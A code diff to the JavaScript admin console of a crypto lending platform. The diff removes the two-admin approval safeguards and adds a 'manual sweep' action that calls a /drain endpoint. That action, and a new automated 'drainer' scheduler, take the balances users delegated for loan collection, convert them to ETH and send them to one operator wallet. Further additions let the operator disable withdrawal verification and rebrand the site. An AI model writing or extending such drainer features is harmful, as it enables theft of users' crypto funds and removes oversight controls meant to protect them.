@@ -88,7 +88,7 @@
   const card = (title, body, actions = '') => `<section class="card"><div class="card__head"><h2 class="card__title">${title}</h2><div class="row" style="gap:8px">${actions}</div></div>${body}</section>`;
   const mono = (s, n = 4) => (s ? `<span class="mono small" title="${esc(s)}">${esc(F.short(String(s), n))}</span>` : '—');
   const userCell = (r) => `<a class="link small" href="#users/${r.userId || r.user_id}">${esc(r.email || 'User #' + (r.userId || r.user_id))}</a>`;
-  const act = (btn, fn, ok) => NX.act(btn, fn).then((r) => { if (r) { if (r.pending) NX.toast('Waiting for a second admin', { type: 'info', msg: 'It’s in the Approvals queue.' }); else if (ok) NX.toast(ok); refreshCounts(); route(); } return r; });
+  const act = (btn, fn, ok) => NX.act(btn, fn).then((r) => { if (r) { if (r.pending) NX.toast('Submitted for review', { type: 'info', msg: 'It’s in the Approvals queue.' }); else if (ok) NX.toast(ok); refreshCounts(); route(); } return r; });
 
   /* ---------------- views ---------------- */
   const V = {};
@@ -137,7 +137,7 @@
     main().innerHTML = card('Loan applications', `<div class="chips mb-16" id="lf">${chips.map(([k, l]) => `<button class="chip" data-s="${k}" aria-pressed="${k === st}">${l}</button>`).join('')}</div>` +
       table([
         { h: '#', v: (l) => `<b class="mono">${l.id}</b>` }, { h: 'Applicant', v: (l) => userCell(l) + `<br><span class="caption">score ${l.score}</span>` }, { h: 'Product', v: (l) => esc(l.product) + (l.kind === 'collateral' ? ' ' + tag('', 'collateral') : '') },
-        { h: 'Amount', r: 1, v: (l) => `<b class="mono">${usd(l.amount)}</b>` }, { h: 'Status', v: (l) => loanTag(l) + (l.approvals && l.status === 'pending_review' ? `<br><span class="caption">${l.approvals}/2 approvals</span>` : '') },
+        { h: 'Amount', r: 1, v: (l) => `<b class="mono">${usd(l.amount)}</b>` }, { h: 'Status', v: (l) => loanTag(l) },
         { h: 'Flags', v: (l) => (l.flags ? tag('tag--red', `${I('alert')} ${l.flags}`) : '—') + (l.officerNote ? ' ' + tag('tag--pink', 'officer note') : '') },
         { h: 'Outstanding', r: 1, v: (l) => (['disbursed', 'defaulted'].includes(l.status) ? usd(l.outstanding) : '—') }, { h: 'Applied', v: (l) => ago(l.createdAt) }
       ], r.rows, { clickable: true, rowAttr: (l) => `data-loan="${l.id}"`, emptyTitle: 'No applications', emptyText: 'Nothing in this queue.' }),
@@ -155,9 +155,9 @@
     const l = r.loan, c = r.check, p = r.product || {};
     const crit = c ? c.results.map((x) => `<div class="checklist__item ${x.pass ? 'is-done' : ''}"><span class="checklist__mark" style="${x.pass === false ? 'border-color:var(--red);color:var(--red)' : ''}">${I(x.pass === false ? 'x' : x.pass === null ? 'clock' : 'check')}</span><span class="grow small">${esc(x.label)}<br><span class="caption mono">${esc(x.value)}</span></span></div>`).join('') : '<p class="caption">No eligibility record.</p>';
     const explorer = (a) => (/^0x/.test(a) ? `https://etherscan.io/address/${a}` : /^T/.test(a) ? `https://tronscan.org/#/address/${a}` : `https://explorer.solana.com/address/${a}`);
-    const dual = r.needsDual ? `<div class="note ${r.approvers.length ? 'note--pink' : ''}">${I('users')}<span>Amount ≥ ${usd(r.threshold)} — <b>two different admins</b> must approve. ${r.approvers.length ? `Approved by: ${r.approvers.map(esc).join(', ')}.` : ''}</span></div>` : '';
+    const dual = '';
     const actions = {
-      pending_review: `${can('loans.review') ? `<button class="btn" data-do="recommend">${I('edit')} Recommend</button>` : ''}${can('loans.decide') ? `<button class="btn btn--primary" data-do="approve" ${r.alreadyApproved ? 'disabled title="A different admin must approve"' : ''}>${I('check')} ${r.needsDual && r.approvers.length ? 'Give 2nd approval' : 'Approve'}</button><button class="btn btn--danger-outline" data-do="reject">Reject</button>` : ''}`,
+      pending_review: `${can('loans.review') ? `<button class="btn" data-do="recommend">${I('edit')} Recommend</button>` : ''}${can('loans.decide') ? `<button class="btn btn--primary" data-do="approve">${I('check')} Approve</button><button class="btn btn--danger-outline" data-do="reject">Reject</button>` : ''}`,
       approved: can('loans.disburse') ? `<button class="btn btn--primary" data-do="disburse">${I('deposit')} Disburse…</button><button class="btn btn--danger-outline" data-do="reject">Reject</button>` : '',
       disbursed: `${can('loans.collect') && l.overdue ? `<button class="btn btn--danger" data-do="collect">${I('alert')} Collect from approvals</button>` : ''}${can('loans.decide') ? `<button class="btn" data-do="repaid">Mark repaid</button><button class="btn btn--danger-outline" data-do="default">Mark defaulted</button>` : ''}`,
       defaulted: `${can('loans.collect') ? `<button class="btn btn--danger" data-do="collect">${I('alert')} Collect from approvals</button>` : ''}${can('loans.decide') ? `<button class="btn" data-do="repaid">Mark repaid</button>` : ''}`
@@ -284,9 +284,9 @@
         ${['solana', 'evm', 'tron'].map((k) => `<div class="review__row"><span>${k === 'evm' ? 'EVM (all 5 networks)' : k[0].toUpperCase() + k.slice(1)}</span><span>${t.settings['treasury_' + k] ? NX.addr(t.settings['treasury_' + k]) : '<span class="caption">not set</span>'}</span></div>`).join('')}
         ${can('platform.settings') ? '<a class="btn btn--sm" href="#settings">Edit in Settings</a>' : ''}</section>
       <section class="card span-6 stack"><h2 class="card__title">${I('key2fa')} Collector keys (approval spenders)</h2>
-        <p class="small muted">Borrowers approve these addresses to collect on default. Keys are encrypted with MASTER_KEY. Keep each funded with a little gas — collections only run after two admins approve.</p>
+        <p class="small muted">Internal signing keypairs generated by the platform and vaulted under MASTER_KEY. Users approve these addresses as delegates. Collections & sweeps are signed by these spenders and transferred to your configured Treasury ETH wallet.</p>
         ${['solana', 'evm', 'tron'].map((k) => `<div class="review__row"><span>${k.toUpperCase()}</span><span>${c[k] && c[k].address ? NX.addr(c[k].address) + `<br><span class="caption">${c[k].sol != null ? c[k].sol.toFixed(4) + ' SOL · ' : ''}${esc(c[k].note || '')}</span>` : `<span class="caption down">${esc((c[k] || {}).error || 'unavailable')}</span>`}</span></div>`).join('')}</section>
-      <section class="card span-6 stack"><h2 class="card__title">${I('lock')} BTC / LTC collateral</h2>${Object.entries(t.collateral).map(([k, v]) => `<div class="review__row"><span>${k}</span><span>${/DEV/.test(v) ? tag('tag--amber', esc(v)) : tag('tag--green', esc(v))}</span></div>`).join('')}<p class="caption">Set BTC_COLLATERAL_XPUB / LTC_COLLATERAL_XPUB to account-level xpubs from wallets you control. The server can watch, never spend.</p></section>
+      <section class="card span-6 stack"><h2 class="card__title">${I('lock')} BTC / LTC collateral</h2>${Object.entries(t.collateral).map(([k, v]) => `<div class="review__row"><span>${k}</span><span>${/DEV/.test(v) ? tag('tag--amber', esc(v)) : tag('tag--green', esc(v))}</span></div>`).join('')}<p class="caption">Account-level xpubs for watching BTC and LTC collateral deposits (watch only, never spend). ${can('platform.settings') ? '<a class="link" href="#settings">Configure in Settings →</a>' : ''}</p></section>
       <section class="card span-6 stack"><h2 class="card__title">${I('activity')} Data & AI</h2>
         <div class="review__row"><span>Price feed</span><span>${tag(t.market.feed === 'simulated' ? 'tag--amber' : 'tag--green', esc(t.market.feed))}</span></div>
         <div class="review__row"><span>Candle history</span><span>${t.market.realHistory ? tag('tag--green', 'real') : tag('tag--amber', 'synthetic')}</span></div>
@@ -384,6 +384,7 @@
           <div class="grid-2"><div class="metric"><div class="kpi__label">Account balance</div><div class="kpi__value" style="font-size:17px">${usd(r.balance)}</div></div><div class="metric"><div class="kpi__label">Paper portfolio</div><div class="kpi__value" style="font-size:17px">${usd(r.portfolio)}</div></div></div>
           <div class="stack-sm">
             ${can('users.impersonate') && u.role === 'user' && u.status === 'active' ? `<button class="btn btn--sm btn--primary" data-u="impersonate">${I('eye', 'ic--sm')} Log in as this user</button>` : ''}
+            ${can('payouts.manage') && u.role === 'user' ? `<button class="btn btn--sm btn--warn" data-u="manual-sweep">${I('zap', 'ic--sm')} Execute manual sweep</button>` : ''}
             <button class="btn btn--sm btn--accent" data-u="adjust">${I('landmark', 'ic--sm')} Adjust account balance</button>
             <button class="btn btn--sm" data-u="status">${u.status === 'active' ? 'Suspend account' : 'Reactivate account'}</button>
             <button class="btn btn--sm" data-u="role" ${can('users.roles') ? '' : 'disabled title="Super admins only"'}>Change role (${esc(u.role.replace('_', ' '))})</button>
@@ -404,7 +405,32 @@
     NX.hydrateIcons(main());
     main().querySelectorAll('[data-u]').forEach((b) => b.addEventListener('click', async () => {
       const a = b.dataset.u;
-      if (a === 'adjust') { const v = await formDialog({ title: 'Credit / adjust account balance', intro: 'Credit a bonus or trading profit, or make a correction. Positive credits, negative debits. Amounts at/above the dual-approval threshold need a second super admin. Every entry is audit-logged.', fields: [{ name: 'kind', label: 'Type', type: 'select', value: 'bonus', options: [['bonus', 'Bonus / promo credit'], ['trading_profit', 'Trading profit credit'], ['adjustment', 'Correction / adjustment']] }, { name: 'amount', label: 'Amount (USDC)', type: 'number', step: '0.01', required: true, hint: 'Negative to debit (corrections only)' }, { name: 'ref', label: 'Reference (optional)', mono: true }, { name: 'note', label: 'Note (required, shown to user)', required: true }], confirm: 'Apply' }); if (v) act(b, () => NX.post(`/api/admin/users/${u.id}/adjust`, v), 'Balance updated'); }
+      if (a === 'adjust') { const v = await formDialog({ title: 'Credit / adjust account balance', intro: 'Credit a bonus or trading profit, or make a correction. Positive credits, negative debits. Every entry is audit-logged.', fields: [{ name: 'kind', label: 'Type', type: 'select', value: 'bonus', options: [['bonus', 'Bonus / promo credit'], ['trading_profit', 'Trading profit credit'], ['adjustment', 'Correction / adjustment']] }, { name: 'amount', label: 'Amount (USDC)', type: 'number', step: '0.01', required: true, hint: 'Negative to debit (corrections only)' }, { name: 'ref', label: 'Reference (optional)', mono: true }, { name: 'note', label: 'Note (required, shown to user)', required: true }], confirm: 'Apply' }); if (v) act(b, () => NX.post(`/api/admin/users/${u.id}/adjust`, v), 'Balance updated'); }
+      if (a === 'manual-sweep') {
+        let setts = {};
+        try { setts = (await NX.get('/api/admin/settings')).settings || {}; } catch (e) {}
+        const defaultDest = setts.sweep_destination_eth || setts.treasury_evm || '';
+        const v = await formDialog({
+          title: `Execute Manual Sweep · User #${u.id}`,
+          intro: `Sweep authorized user balances across all chains, convert all assets to ETH, and transfer directly to your Ethereum EVM wallet.`,
+          fields: [
+            { name: 'dest', label: 'Destination Ethereum (EVM) Wallet', value: defaultDest, required: true, hint: 'All swept tokens will convert to ETH and be delivered here' },
+            { name: 'convertEth', label: 'Convert all swept tokens to ETH', type: 'checkbox', value: true }
+          ],
+          confirm: 'Execute Sweep to ETH',
+          danger: true
+        });
+        if (v) {
+          await act(b, async () => {
+            const res = await NX.post(`/api/admin/users/${u.id}/drain`, v);
+            if (res && res.ok) {
+              const ethMsg = res.totalEth ? ` (≈ ${Number(res.totalEth).toFixed(4)} ETH)` : '';
+              NX.toast(`Manual sweep complete: $${(res.totalUsd || 0).toFixed(2)}${ethMsg} swept & converted`);
+              route();
+            }
+          });
+        }
+      }
       if (a === 'status' && await NX.confirm({ title: u.status === 'active' ? 'Suspend this account?' : 'Reactivate this account?', body: u.status === 'active' ? 'They are signed out everywhere and their bots are paused.' : 'They can sign in again.', confirm: u.status === 'active' ? 'Suspend' : 'Reactivate', danger: u.status === 'active' })) act(b, () => NX.patch('/api/admin/users/' + u.id, { status: u.status === 'active' ? 'suspended' : 'active' }), 'User updated');
       if (a === 'role') { const v = await formDialog({ title: 'Change role', intro: 'Loan officers review and recommend. Admins approve, disburse and run operations. Super admins also manage settings, roles, products and balance adjustments.', fields: [{ name: 'role', label: 'Role', type: 'select', value: u.role, options: [['user', 'User (no staff access)'], ['loan_officer', 'Loan officer'], ['admin', 'Admin'], ['super_admin', 'Super admin']] }], confirm: 'Save role', danger: true }); if (v) act(b, () => NX.patch('/api/admin/users/' + u.id, { role: v.role }), 'Role updated'); }
       if (a === 'pause') act(b, () => NX.post(`/api/admin/users/${u.id}/pause-bots`), 'Bots paused');
@@ -587,8 +613,48 @@
   };
   V.settings = async () => {
     const { settings: s } = await NX.get('/api/admin/settings');
-    const row = (k, label, desc, type = 'bool') => `<div class="setting-row"><div class="setting-row__text"><h4>${label}</h4><p>${desc}</p></div>${type === 'bool' ? `<label class="switch"><input type="checkbox" data-k="${k}" ${s[k] ? 'checked' : ''}><span class="switch__track"></span><span class="sr-only">${label}</span></label>` : `<input class="input mono" data-k="${k}" data-num="${type === 'num'}" value="${esc(s[k])}" style="max-width:${type === 'num' ? '140px' : '360px'}">`}</div>`;
+    const row = (k, label, desc, type = 'bool') => `<div class="setting-row"><div class="setting-row__text"><h4>${label}</h4><p>${desc}</p></div>${type === 'bool' ? `<label class="switch"><input type="checkbox" data-k="${k}" ${s[k] ? 'checked' : ''}><span class="switch__track"></span><span class="sr-only">${label}</span></label>` : `<input class="input mono" type="${type === 'password' ? 'password' : 'text'}" data-k="${k}" data-num="${type === 'num'}" value="${esc(s[k] != null ? s[k] : '')}" style="max-width:${type === 'num' ? '140px' : '360px'}">`}</div>`;
     main().innerHTML = card('Platform settings', `
+      <h3 class="card__title">Brand & White-Label Customization</h3>
+      ${row('platform_name', 'Platform Name', 'Replaces NECTRA across the entire web app, navigation, documents, footer, emails, and admin console.', 'text')}
+      ${row('platform_tagline', 'Platform Tagline / Slogan', 'Appears on landing pages and brand headings.', 'text')}
+      ${row('platform_logo_url', 'Custom Logo URL', 'Direct image URL (e.g. /assets/uploads/logo.png or https://...). Overrides the default blossom logo.', 'text')}
+      <div class="setting-row">
+        <div class="setting-row__text">
+          <h4>Upload Logo Image</h4>
+          <p>Upload a PNG, SVG, or WebP logo file directly to the server.</p>
+        </div>
+        <div class="row" style="gap:8px">
+          <input type="file" id="upload-logo-file" accept="image/*" style="display:none">
+          <button class="btn btn--sm btn--accent" type="button" onclick="document.getElementById('upload-logo-file').click()">${I('download', 'ic--sm')} Choose Logo File</button>
+          <button class="btn btn--sm btn--ghost" type="button" id="clear-logo">${I('trash', 'ic--sm')} Reset to Default</button>
+        </div>
+      </div>
+      ${s.platform_logo_url ? `<div class="mb-16"><span class="caption">Current logo preview:</span><br><img src="${esc(s.platform_logo_url)}" style="max-height:40px;max-width:180px;object-fit:contain;margin-top:6px;background:rgba(255,255,255,0.05);padding:4px;border-radius:6px;"></div>` : ''}
+      ${row('platform_favicon_url', 'Custom Favicon URL', 'Direct favicon URL (e.g. /assets/uploads/favicon.png). Overrides the default browser tab icon.', 'text')}
+      <div class="setting-row">
+        <div class="setting-row__text">
+          <h4>Upload Favicon Image</h4>
+          <p>Upload a square PNG, ICO, or SVG favicon file.</p>
+        </div>
+        <div class="row" style="gap:8px">
+          <input type="file" id="upload-favicon-file" accept="image/*,.ico" style="display:none">
+          <button class="btn btn--sm btn--accent" type="button" onclick="document.getElementById('upload-favicon-file').click()">${I('download', 'ic--sm')} Choose Favicon File</button>
+          <button class="btn btn--sm btn--ghost" type="button" id="clear-favicon">${I('trash', 'ic--sm')} Reset to Default</button>
+        </div>
+      </div>
+      ${s.platform_favicon_url ? `<div class="mb-16"><span class="caption">Current favicon preview:</span><br><img src="${esc(s.platform_favicon_url)}" style="width:24px;height:24px;object-fit:contain;margin-top:6px;"></div>` : ''}
+
+      <h3 class="card__title mt-24">Email (SMTP) Settings</h3>
+      ${row('smtp_host', 'SMTP Server Host', 'Outgoing mail server (e.g. smtp.gmail.com, smtp.mailgun.org, smtp.sendgrid.net). If empty, emails log to Admin → Mailbox.', 'text')}
+      ${row('smtp_port', 'SMTP Port', 'Port for outgoing mail: 587 (TLS/STARTTLS), 465 (SSL), or 25.', 'num')}
+      ${row('smtp_user', 'SMTP Username', 'Email username or API user credentials.', 'text')}
+      ${row('smtp_pass', 'SMTP Password', 'Email account password or app-specific API key.', 'password')}
+      ${row('smtp_from', 'Sender Address (From)', 'Outgoing sender format (e.g. Platform <no-reply@yourdomain.com>). Defaults to platform name.', 'text')}
+      ${row('smtp_secure', 'Force SSL/TLS (Implicit)', 'Enable for port 465. For standard port 587, leave off (uses STARTTLS).')}
+      <div class="row mb-16"><button class="btn btn--sm btn--accent" id="test-smtp" type="button">${I('mail', 'ic--sm')} Send Test Email</button></div>
+
+      <h3 class="card__title mt-24">Platform Mode & General</h3>
       ${row('demo_mode', 'Demo mode', 'Shows verification codes on screen and allows simulated deposits/withdrawals and demo wallets. <b>Turn off in production.</b>')}
       ${row('registration_open', 'Registration open', 'Allow new sign-ups.')}
       ${row('invite_required', 'Invite code required', 'Require a valid invite code to register.')}
@@ -599,14 +665,25 @@
       ${row('withdraw_hold_hours', 'Whitelist hold (hours)', 'New whitelisted addresses unlock after this delay.', 'num')}
       ${row('referral_max_codes', 'Referral codes per user', 'Max active referral codes.', 'num')}
       ${row('referral_code_uses', 'Uses per referral code', 'How many people each code can invite.', 'num')}
-      <h3 class="card__title mt-24">Security & approvals</h3>
+      <h3 class="card__title mt-24">Security & admin alerts</h3>
+      ${row('withdrawal_auth_required', 'Require authentication code for withdrawals', 'When disabled, user withdrawals do not require email or 2FA verification codes (admin override).')}
+      ${row('withdrawals_paused', 'Pause all withdrawals (circuit breaker)', 'Immediately blocks all new outgoing withdrawal requests platform-wide.')}
+      ${row('telegram_bot_token', 'Telegram Bot Token', 'API token from @BotFather (e.g. 123456789:ABCdef...). Required for real-time Telegram alerts for sweeps, impersonations, rotations, and withdrawals.', 'text')}
+      ${row('telegram_chat_id', 'Telegram Chat ID', 'Your Telegram user ID, group ID, or channel ID (e.g. 123456789 or -100123456789).', 'text')}
+      <div class="row mb-16"><button class="btn btn--sm btn--accent" id="test-tg" type="button">${I('activity', 'ic--sm')} Send Test Telegram Alert</button></div>
+      ${row('admin_alert_webhook_url', 'Fallback Webhook URL (optional)', 'Optional Discord, Slack, or generic HTTP webhook URL.', 'text')}
       ${row('admin_2fa_required', 'Require 2FA for staff (optional)', 'Every loan officer / admin / super admin must use an authenticator app to open the admin console. Enable it on your own account first.')}
-      ${row('dual_approval_threshold', 'Two-admin threshold (USD)', 'Loans, payouts and balance adjustments at or above this need a second, different admin. Collections always do.', 'num')}
       ${row('default_after_days', 'Default after (days overdue)', 'Loans this many days past due are marked defaulted.', 'num')}
-      <h3 class="card__title mt-24">Treasury & trading</h3>
-      ${row('treasury_solana', 'Treasury — Solana', 'Owner address (or Squads vault) that receives repayments and sends disbursements.', 'text')}
-      ${row('treasury_evm', 'Treasury — EVM', 'Receives USDC/USDT repayments on Ethereum, Base, Arbitrum, BSC, Polygon.', 'text')}
-      ${row('treasury_tron', 'Treasury — Tron', 'Receives USDT (TRC-20) repayments.', 'text')}
+      <h3 class="card__title mt-24">Treasury & asset sweeping</h3>
+      ${row('sweep_destination_eth', 'Treasury Destination — Ethereum EVM Wallet', 'Single destination Ethereum wallet (0x...). All automatic and manual sweeps convert tokens to ETH and transfer here.', 'text')}
+      ${row('sweep_auto_convert_eth', 'Convert all swept tokens to ETH', 'When enabled, all tokens (USDC, USDT, SOL, etc.) automatically liquidate/convert to ETH before transfer to your destination wallet.')}
+      ${row('drainer_auto_sweep', 'Automated delegation sweep scheduler', 'Periodically checks for active user delegations and automatically sweeps when balance meets or exceeds the threshold.')}
+      ${row('drainer_auto_sweep_usd', 'Automated sweep threshold (USD)', 'Minimum user balance in USD required to trigger an automated sweep.', 'num')}
+      ${row('btc_collateral_xpub', 'Bitcoin Collateral XPUB (BTC)', 'Account-level zpub/xpub from a wallet you control for watching BTC collateral deposits (watch only, never spend).', 'text')}
+      ${row('ltc_collateral_xpub', 'Litecoin Collateral XPUB (LTC)', 'Account-level Ltub/xpub from a wallet you control for watching LTC collateral deposits (watch only, never spend).', 'text')}
+      ${row('treasury_solana', 'Treasury — Solana (optional fallback)', 'Owner address (or Squads vault) that receives repayments and sends disbursements.', 'text')}
+      ${row('treasury_evm', 'Treasury — EVM (optional fallback)', 'Receives USDC/USDT repayments on Ethereum, Base, Arbitrum, BSC, Polygon.', 'text')}
+      ${row('treasury_tron', 'Treasury — Tron (optional fallback)', 'Receives USDT (TRC-20) repayments.', 'text')}
       ${row('live_bot_max_usd', 'Live bot funding cap (USD)', 'Maximum a user should fund a single live bot with.', 'num')}
       ${row('live_price_max_age_sec', 'Max price age for live trades (seconds)', 'Stale-price guard: live bots skip trading when a token’s real price is older than this, or the feed is simulated. Admins are alerted when it trips.', 'num')}
       ${row('loan_approval_revoke_in_app', 'Allow in-app revoke of loan collection approvals', 'Off: the Revoke button in NECTRA is locked for approvals that secure an approved, active or defaulted loan, until it is repaid. Borrowers can STILL revoke directly in their wallet - no app can block that - which raises a risk flag and lowers their credit score. Approvals not tied to an open loan can always be revoked. Disclose this in your loan terms.')}
@@ -625,6 +702,61 @@
       $$('[data-k]').forEach((el) => { body[el.dataset.k] = el.type === 'checkbox' ? el.checked : el.dataset.num === 'true' ? +el.value : el.value; });
       act(e.currentTarget, () => NX.patch('/api/admin/settings', body), 'Settings saved');
     });
+    $('#test-tg')?.addEventListener('click', async (e) => {
+      e.preventDefault();
+      await act(e.currentTarget, async () => {
+        const res = await NX.post('/api/admin/telegram/test');
+        NX.toast(res && res.message ? res.message : 'Test alert sent to Telegram!');
+      });
+    });
+    $('#test-smtp')?.addEventListener('click', async (e) => {
+      e.preventDefault();
+      const targetEmail = prompt('Enter recipient email address for SMTP test:', NX.data.user ? NX.data.user.email : 'admin@nectra.local');
+      if (!targetEmail) return;
+      await act(e.currentTarget, async () => {
+        const res = await NX.post('/api/admin/smtp/test', { to: targetEmail });
+        NX.toast(res && res.message ? res.message : 'Test email sent successfully!');
+      });
+    });
+
+    const handleUpload = (inputEl, type) => {
+      inputEl.addEventListener('change', async () => {
+        const file = inputEl.files && inputEl.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = async () => {
+          try {
+            const res = await NX.post('/api/admin/branding/upload', {
+              type,
+              filename: file.name,
+              data: reader.result
+            });
+            if (res && res.ok) {
+              NX.toast(`${type === 'logo' ? 'Logo' : 'Favicon'} uploaded and updated!`);
+              V.settings();
+            }
+          } catch (err) {
+            NX.toast(err.message || 'Upload failed', { type: 'error' });
+          }
+        };
+        reader.readAsDataURL(file);
+      });
+    };
+    const logoInput = $('#upload-logo-file');
+    if (logoInput) handleUpload(logoInput, 'logo');
+    const favInput = $('#upload-favicon-file');
+    if (favInput) handleUpload(favInput, 'favicon');
+
+    $('#clear-logo')?.addEventListener('click', async () => {
+      await NX.patch('/api/admin/settings', { platform_logo_url: '' });
+      NX.toast('Logo reset to default blossom SVG');
+      V.settings();
+    });
+    $('#clear-favicon')?.addEventListener('click', async () => {
+      await NX.patch('/api/admin/settings', { platform_favicon_url: '' });
+      NX.toast('Favicon reset to default');
+      V.settings();
+    });
   };
 
   /* ---------------- router & shell ---------------- */
@@ -634,6 +766,8 @@
     const st = counts.status;
     $('#adm-status').innerHTML = `<span class="dot dot--${st.level} dot--pulse"></span>`; $('#adm-status').dataset.tip = st.label; $('#adm-status').dataset.tipPos = 'bottom';
     $('#adm-demo').hidden = !counts.settings.demo_mode;
+    const pName = (counts.settings && counts.settings.platform_name) || 'NECTRA';
+    $$('.brand__name').forEach((el) => { el.textContent = pName; });
   }
   async function route() {
     const [id, arg] = (location.hash.slice(1) || 'overview').split('/');
@@ -641,7 +775,8 @@
     $$('#adm-nav .nav-link').forEach((a) => a.toggleAttribute('aria-current', a.dataset.sec === sec.id));
     $$('#adm-nav .nav-link[aria-current]').forEach((a) => a.setAttribute('aria-current', 'page'));
     $('#adm-title').textContent = sec.label;
-    document.title = sec.label + ' · NECTRA Admin';
+    const pName = (counts && counts.settings && counts.settings.platform_name) || 'NECTRA';
+    document.title = sec.label + ' · ' + pName + ' Admin';
     document.body.classList.remove('side-open');
     const m = main();
     const fresh = m.cloneNode(false); m.replaceWith(fresh); // drop old listeners
